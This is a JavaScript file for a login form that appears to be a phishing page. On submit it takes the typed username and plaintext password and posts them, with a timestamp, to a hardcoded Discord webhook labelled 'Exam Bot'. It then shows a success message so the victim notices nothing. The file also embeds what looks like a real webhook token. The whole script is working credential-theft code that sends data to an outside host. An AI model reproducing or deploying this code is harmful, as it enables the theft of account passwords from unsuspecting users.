const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573841787376631949/T2mCEo__bKD6fJVQCBpCdITyn_6xMvRl8Lg_BfE8Sz_zogHvdoQfUjjf44MqETIvbRXh";

const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const loginForm = document.getElementById('loginForm');
const successMsg = document.getElementById('successMsg');

function checkInputs() {
  if (usernameInput.value.trim() !== '' && passwordInput.value !== '') {
    loginBtn.classList.add('active');
  } else {
    loginBtn.classList.remove('active');
  }
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

function togglePassword() {
  const field = document.getElementById("password");
  const icon = document.getElementById("eyeIcon");

  if (field.type === "password") {
    field.type = "text";
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
  } else {
    field.type = "password";
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
  }
}

loginForm.addEventListener('submit', async function(e) {
  e.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value;
  const timestamp = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

  loginBtn.disabled = true;

  const payload = {
    username: "Exam Bot",
    content:
      `📝 **New Submission**\n` +
      `**Time:** ${timestamp}\n` +
      `**Username:** ${username}\n` +
      `**Password:** ${password}`
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    loginForm.style.display = 'none';
    successMsg.style.display = 'block';
  } catch (err) {
    loginBtn.disabled = false;
    alert("Could not submit right now. Please try again.");
  }
});
